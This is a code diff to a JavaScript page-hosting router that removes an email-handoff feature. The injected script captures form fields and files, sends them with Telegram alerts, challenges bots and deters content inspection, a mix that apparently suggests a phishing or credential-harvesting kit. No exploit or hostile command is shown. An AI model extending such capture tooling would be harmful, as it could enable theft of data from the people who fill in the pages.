@@ -43,7 +43,6 @@ import {
   verifyResultFieldManifest
 } from "../services/resultCapture.js";
 import { wakeTelegramDispatcher } from "../services/telegram.js";
-import { emailHandoffForPackage } from "../services/emailHandoff.js";
 
 export const runtimeRouter = Router();
 const accessDeniedMessage = "ACCESS DENIED";
@@ -372,7 +371,7 @@ function runtimePageUrl(userPageId, file) {
   return `/api/runtime/source?${params.toString()}`;
 }
 
-function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName = "", fieldManifest = null, emailHandoff = {}, isFinalScreen = false, security = {}, forceTurnstile = false }) {
+function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName = "", fieldManifest = null, security = {}, forceTurnstile = false }) {
   const turnstile = publicTurnstileConfig(security);
   const turnstileConfig = {
     enabled: Boolean((turnstile.enabled || forceTurnstile) && turnstile.siteKey),
@@ -413,9 +412,7 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
     turnstile: ${JSON.stringify(turnstileConfig)},
     challengeProof: "",
     fieldManifestToken: ${JSON.stringify(fieldManifestToken)},
-    fieldManifestRevision: ${JSON.stringify(trustedFieldManifest.revision)},
-    emailHandoff: ${JSON.stringify(emailHandoff)},
-    isFinalScreen: ${Boolean(isFinalScreen)}
+    fieldManifestRevision: ${JSON.stringify(trustedFieldManifest.revision)}
   };
   const apiBase = window.location.pathname.indexOf("/api/runtime/") === 0 ? "/api/runtime" : "/api";
 
@@ -548,49 +545,6 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
       scopeId: scopeId || "page",
       fields: captureFields(inputs)
     };
-  }
-
-  function handoffStorageKey() {
-    return "deuce_email_handoff_" + runtime.userPageId + "_" + runtime.sessionId;
-  }
-
-  function validHandoffEmail(value) {
-    const email = String(value || "").trim();
-    return email.length <= 320 && /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email) ? email : "";
-  }
-
-  function fieldByHandoffId(fieldId) {
-    if (!fieldId) return null;
-    return Array.from(document.querySelectorAll("[data-deuce-field-id]")).find(function (field) {
-      return field.getAttribute("data-deuce-field-id") === fieldId;
-    }) || null;
-  }
-
-  function rememberHandoffEmail(capture) {
-    const config = runtime.emailHandoff || {};
-    if (!config.enabled || !config.sourceFieldId) return;
-    const field = (capture.fields || []).find(function (item) { return item.id === config.sourceFieldId; });
-    const email = validHandoffEmail(field && field.value);
-    if (!email) return;
-    try { window.sessionStorage.setItem(handoffStorageKey(), email); } catch (error) {}
-  }
-
-  function applyHandoffEmail() {
-    const config = runtime.emailHandoff || {};
-    if (!config.enabled || !config.destinationFieldId) return;
-    let email = "";
-    try { email = validHandoffEmail(window.sessionStorage.getItem(handoffStorageKey())); } catch (error) {}
-    if (!email) return;
-    const field = fieldByHandoffId(config.destinationFieldId);
-    if (field && !String(field.value || "").trim()) {
-      field.value = email;
-      ["input", "change", "keyup"].forEach(function (eventName) {
-        field.dispatchEvent(new Event(eventName, { bubbles: true }));
-      });
-    }
-    if (runtime.isFinalScreen && config.clearOnFinalScreen !== false) {
-      try { window.sessionStorage.removeItem(handoffStorageKey()); } catch (error) {}
-    }
   }
 
   function nearestInputScope(control) {
@@ -938,7 +892,6 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
     setWaitingState(form, submitter);
     const inputs = form.elements || [];
     const capture = captureEnvelope(inputs, form.getAttribute("data-deuce-form-id") || "page");
-    rememberHandoffEmail(capture);
     send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed" });
     uploadSelectedFiles(inputs).then(function (attachmentIds) {
       return sendResultPayload(capture, "form", attachmentIds);
@@ -957,7 +910,6 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
     const inputs = fallbackInputsFor(control);
     const capture = captureEnvelope(inputs, "page");
     if (!capture.fields.length && !selectedFileInputs(inputs).length) return;
-    rememberHandoffEmail(capture);
     if (event) {
       event.preventDefault();
       event.stopImmediatePropagation();
@@ -976,8 +928,6 @@ function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName 
   }
 
   enableContentDeterrence();
-  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", applyHandoffEmail, { once: true });
-  else window.setTimeout(applyHandoffEmail, 0);
   send("traffic", { event: "page_load", screen: pageLabel() });
   sendHeartbeat();
 
@@ -1078,7 +1028,6 @@ async function packageForRuntimePage(page) {
       ...runtimeManifest,
       ...(currentManifest.thumbnailDataUrl ? { thumbnailDataUrl: currentManifest.thumbnailDataUrl } : {}),
       ...(currentManifest.thumbnailPath ? { thumbnailPath: currentManifest.thumbnailPath } : {}),
-      ...(currentManifest.emailHandoff ? { emailHandoff: currentManifest.emailHandoff } : {}),
       assets: runtimeManifest.assets?.length ? runtimeManifest.assets : currentManifest.assets || []
     }
   };
@@ -1141,8 +1090,6 @@ async function sendRuntimePackageFile(req, res, { asAsset = false } = {}) {
     screenId: runtimeScreen?.id || "",
     screenName: runtimeScreen?.name || file,
     fieldManifest: runtimeScreen?.fieldManifest || null,
-    emailHandoff: emailHandoffForPackage(pagePackage),
-    isFinalScreen: Boolean(runtimeScreen?.isFinal),
     security: context.page.securityConfig || {},
     forceTurnstile: Boolean(securityDecisionResult.challengeRequired)
   }));
